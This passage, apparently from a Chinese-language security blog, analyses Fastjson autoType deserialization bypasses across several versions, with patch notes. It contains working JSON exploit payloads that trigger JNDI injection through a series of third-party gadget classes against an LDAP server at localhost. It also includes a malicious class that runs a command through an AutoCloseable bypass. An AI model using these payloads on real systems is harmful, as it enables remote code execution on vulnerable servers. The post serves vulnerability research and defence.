<p>由于Poc开头不为<code>@type</code>等预置类型，所以按Map类型解析，其中会调用<code>parseObject()</code>，第一次反序列化时，<code>java.lang.Class</code>绕过黑名单，将<code>com.sun.rowset.JdbcRowSetImpl</code>加入到缓存数组，第二次反序列化时，由于<code>com.sun.rowset.JdbcRowSetImpl</code>已在缓存之中，所以绕过了黑名单检测的过程，成功进行JNDI注入</p>
<p><strong>分析</strong></p>
<p>在IDEA中把mappings成员添加到断点中</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242020d3262fb8bf8cb8b77d92.png" alt="image-20210524175959882" style="zoom: 67%;" />

<p>勾上<code>Field access</code>选项</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242020e7c324ba7cb18e536e22.png" alt="image-20210524180038665" style="zoom: 67%;" />

<p>在运行完<code>java.lang.Class</code>类的<code>parseObject()</code>函数之后再进行监听，持续跟进就会看到调用到下面的<code>loadClass()</code>函数，大概情况就是<code>java.lang.Class</code>在反序列化时会把<code>value</code>属性值识别为<code>Object</code>类型，如果<code>key</code>值本身又属于<code>Class.class</code>类型时，便会对<code>value</code>属性值调用下面的<code>loadClass()</code>函数把这个<code>Object</code>加载进来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TypeUtils</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="type">boolean</span> cache) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className != <span class="literal">null</span> &amp;&amp; className.length() != <span class="number">0</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = (Class)mappings.get(className);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">                <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">                        clazz = classLoader.loadClass(className);</span><br><span class="line">                        <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">                            mappings.put(className, clazz);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                    var7.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                    <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">                        clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                        <span class="keyword">if</span> (cache) &#123; <span class="comment">// 支持缓存</span></span><br><span class="line">                            mappings.put(className, clazz); <span class="comment">// 把类名和类存进mappings</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var6) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    clazz = Class.forName(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当第二次解析<code>@type</code>时就可以绕过黑名单校验了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ParserConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">		</span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            hash = h3;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">                hash ^= (<span class="type">long</span>)className.charAt(i);</span><br><span class="line">                hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> clazz;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123; <span class="comment">// 当第二次解析@type时，com.sun.rowset.JdbcRowSetImpl以存储在mappings中，导致绕过黑名单</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105242043a777324565c5c5c4d5b4.png" alt="image-20210524172832135" style="zoom:80%;" />

<p><strong>Patch</strong></p>
<p>把<code>java.lang.Class</code>列入黑名单，把默认缓存从True改为False</p>
<h3 id="1-2-62漏洞"><a href="#1-2-62漏洞" class="headerlink" title="1.2.62漏洞"></a>1.2.62漏洞</h3><blockquote>
<p>使用新的Gadget绕过黑名单</p>
<p>需要 Fastjson版本 ≤ 1.2.62，并且需要开启setAutoTypeSupport</p>
<p>需要额外安装xbean-reflect（我的测试版本为3.4）</p>
</blockquote>
<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.xbean.propertyeditor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractConverter</span> <span class="keyword">extends</span> <span class="title class_">PropertyEditorSupport</span> <span class="keyword">implements</span> <span class="title class_">Converter</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.toObject(text.trim()); <span class="comment">// 调用toObject()函数</span></span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.toObjectImpl(text.trim()); <span class="comment">// 调用toObjectImpl()函数</span></span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.xbean.propertyeditor;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiConverter</span> <span class="keyword">extends</span> <span class="title class_">AbstractConverter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="keyword">return</span> (Context)context.lookup(text); <span class="comment">// 调用lookup()函数实现JNDI注入</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里提供了一个新的思路就是可以从父类中找<code>set</code>函数，但也算不上是新的思路，只不过是找到第三方库里面的<code>lookup()</code>函数再向上回溯罢了 : )</p>
<p><strong>Patch</strong></p>
<p>扩充黑名单</p>
<h3 id="1-2-66漏洞"><a href="#1-2-66漏洞" class="headerlink" title="1.2.66漏洞"></a>1.2.66漏洞</h3><blockquote>
<p>使用新的Gadget绕过黑名单</p>
<p>需要 Fastjson版本 ≤ 1.2.66，并且需要开启setAutoTypeSupport</p>
<p>下面用到的Gadget都需要导入第三方库，直接搜就好，部分触发时必须使用parseObject()函数</p>
</blockquote>
<p>公开的Gadget一共有下面四个：</p>
<p><strong>JndiObjectFactory</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>触发代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.shiro.jndi;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiObjectFactory</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">JndiLocator</span> <span class="keyword">implements</span> <span class="title class_">Factory</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setResourceName</span><span class="params">(String resourceName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.resourceName = resourceName; <span class="comment">// 传入resourceName</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.requiredType != <span class="literal">null</span> ? <span class="built_in">this</span>.requiredType.cast(<span class="built_in">this</span>.lookup(<span class="built_in">this</span>.resourceName, <span class="built_in">this</span>.requiredType)) : <span class="built_in">this</span>.lookup(<span class="built_in">this</span>.resourceName); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> <span class="built_in">this</span>.requiredType != <span class="literal">null</span> ? <span class="built_in">this</span>.requiredType.getName() : <span class="string">&quot;object&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to look up &quot;</span> + typeName + <span class="string">&quot; with jndi name &#x27;&quot;</span> + <span class="built_in">this</span>.resourceName + <span class="string">&quot;&#x27;.&quot;</span>, var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>AnterosDBCPConfig</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>触发代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> br.com.anteros.dbcp;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnterosDBCPConfig</span> <span class="keyword">implements</span> <span class="title class_">AnterosDBCPConfigMXBean</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMetricRegistry</span><span class="params">(Object metricRegistry)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.metricsTrackerFactory != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;cannot use setMetricRegistry() and setMetricsTrackerFactory() together&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (metricRegistry != <span class="literal">null</span>) &#123;</span><br><span class="line">                metricRegistry = <span class="built_in">this</span>.getObjectOrPerformJndiLookup(metricRegistry); <span class="comment">// 传入metricRegistry</span></span><br><span class="line">                <span class="keyword">if</span> (!UtilityElf.safeIsAssignableFrom(metricRegistry, <span class="string">&quot;com.codahale.metrics.MetricRegistry&quot;</span>) &amp;&amp; !UtilityElf.safeIsAssignableFrom(metricRegistry, <span class="string">&quot;io.micrometer.core.instrument.MeterRegistry&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Class must be instance of com.codahale.metrics.MetricRegistry or io.micrometer.core.instrument.MeterRegistry&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.metricRegistry = metricRegistry;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">getObjectOrPerformJndiLookup</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (object <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">initCtx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="keyword">return</span> initCtx.lookup((String)object); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(var3);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>CacheJndiTmLookup</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,\&quot;jndiNames\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>触发代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.ignite.cache.jta.jndi;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheJndiTmLookup</span> <span class="keyword">implements</span> <span class="title class_">CacheTmLookup</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setJndiNames</span><span class="params">(List&lt;String&gt; jndiNames)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jndiNames = jndiNames; <span class="comment">// 传入jndiNames</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">public</span> TransactionManager <span class="title function_">getTm</span><span class="params">()</span> <span class="keyword">throws</span> IgniteException &#123;</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">this</span>.jndiNames != <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> !<span class="built_in">this</span>.jndiNames.isEmpty();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.jndiNames.iterator(); <span class="comment">// 获取jndiNames</span></span><br><span class="line"></span><br><span class="line">            Object obj;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> (String)var2.next(); <span class="comment">// 获取jndiNames</span></span><br><span class="line">                obj = ctx.lookup(s); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">            &#125; <span class="keyword">while</span>(obj == <span class="literal">null</span> || !(obj <span class="keyword">instanceof</span> TransactionManager));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> (TransactionManager)obj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IgniteException</span>(<span class="string">&quot;Unable to lookup TM by: &quot;</span> + <span class="built_in">this</span>.jndiNames, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>JtaTransactionConfig</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>触发代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ibatis.sqlmap.engine.transaction.jta;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JtaTransactionConfig</span> <span class="keyword">extends</span> <span class="title class_">BaseTransactionConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties props)</span> <span class="keyword">throws</span> SQLException, TransactionException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">utxName</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            utxName = (String)props.get(<span class="string">&quot;UserTransaction&quot;</span>); <span class="comment">// 这里需要传入一个Properties对象，然后里面UserTransaction属性的值</span></span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initCtx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="built_in">this</span>.userTransaction = (UserTransaction)initCtx.lookup(utxName); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SqlMapException</span>(<span class="string">&quot;Error initializing JtaTransactionConfig while looking up UserTransaction (&quot;</span> + utxName + <span class="string">&quot;).  Cause: &quot;</span> + var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>Patch</strong></p>
<p>扩充黑名单</p>
<h3 id="1-2-68漏洞"><a href="#1-2-68漏洞" class="headerlink" title="1.2.68漏洞"></a>1.2.68漏洞</h3><blockquote>
<p>1.2.68版本增加了新的安全参数<strong>safeMode</strong>，具体可参考这个<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">链接</a>，当safeMode开启后，autoType会被完全禁用，但是默认情况下时关闭的，开启safeMode代码：<code>ParserConfig.getGlobalInstance().setSafeMode(true);</code> </p>
</blockquote>
<p><strong>恶意类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">Exp</span> <span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123; </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>客户端</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonstr</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;com.fastjson.Exp\&quot;&#125;&quot;</span>;</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonstr);</span><br><span class="line">System.out.println(obj)</span><br></pre></td></tr></table></figure>

<p>在不开启<code>safeMode</code>的情况下，我们可以使用<code>java.lang.AutoCloseable</code>引入任意恶意类，和<strong>1.2.47</strong>版本的洞很类似，这里利用到的是<code>checkAutoType()</code>函数中<code>expectClass</code>参数，如果加载的类实现了<code>expectClass</code>接口，或者是属于<code>expectClass</code>的子类，那么<code>checkAutoType()</code>函数就会检测通过</p>
<p>利用这个特点，我们可以利用一个<code>TypeUtils.mappings</code>自带的类<code>java.lang.AutoCloseable</code>，这个类在进行反序列化时，如果检验到后面的字符串也是一个类的话，就会把自己作为<code>expectClass</code>调用<code>checkAutoType()</code>函数，这时候如果我们将恶意类编写成实现了<code>java.lang.AutoCloseable</code>接口的类，就可以成功绕过<code>checkAutoType()</code></p>
<p><strong>分析</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaBeanDeserializer</span> <span class="keyword">implements</span> <span class="title class_">ObjectDeserializer</span> &#123;    </span><br><span class="line">	<span class="keyword">protected</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName, Object object, <span class="type">int</span> features, <span class="type">int</span>[] setFlags)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">            </span><br><span class="line">		<span class="keyword">if</span> (!ref.equals(<span class="built_in">this</span>.beanInfo.typeName) &amp;&amp; !parser.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">            refObj = getSeeAlso(config, <span class="built_in">this</span>.beanInfo, ref);</span><br><span class="line">            Class&lt;?&gt; userType = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (refObj == <span class="literal">null</span>) &#123;</span><br><span class="line">                Class&lt;?&gt; expectClass = TypeUtils.getClass(type);</span><br><span class="line">                userType = config.checkAutoType(ref, expectClass, lexer.getFeatures()); <span class="comment">// ref实现了java.lang.AutoCloseable接口的恶意类，java.lang.AutoCloseable作为expectClass参数传入</span></span><br><span class="line">                refObj = parser.getConfig().getDeserializer(userType);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">typedObject</span> <span class="operator">=</span> ((ObjectDeserializer)refObj).deserialze(parser, userType, fieldName); <span class="comment">// 绕过成功之后进行反序列化</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>



<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><ul>
<li>在1.2.43版本之前的漏洞主要是通过在类名中加入混淆字符而绕过<code>checkAutoType()</code>，特别是1.2.43版本的漏洞利用让我知道了即使json字符串不规范也是可以解析成功的</li>
<li>在1.2.45版本之后大部分都是通过第三方库寻找新的Gadget来绕过黑白名单，通过检查其实例创建函数或者set函数是否存在<code>lookup()</code>函数以及参数是否可控来挖掘</li>
<li>1.2.47版本的漏洞利用十分的巧妙，通过分析黑名单校验的<code>getClassFromMapping()</code>字段，想到用缓存进行绕过</li>
<li>1.2.68版本的漏洞利用也是同样巧妙，通过分析<code>expectClass</code>字段是否可控挖掘出了<code>java.lang.AutoCloseable</code>的Gadget，而且在Fastjson的可利用类中还存在着更多类似的利用，所以了解<code>checkAutoType()</code>方法中的可利用类十分必要，它们分别有：<ul>
<li>白名单（符合白名单条件的类）</li>
<li>TypeUtils.mappings （符合缓存映射中获取的类）</li>
<li>typeMapping （ParserConfig中本身带有的集合）</li>
<li>deserializers （符合反序列化器的类）</li>
</ul>
</li>
</ul>
<h2 id="哈希黑名单"><a href="#哈希黑名单" class="headerlink" title="哈希黑名单"></a>哈希黑名单</h2><p>由某些大哥爆破出来的哈希黑名单列表：<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson blacklist</a></p>
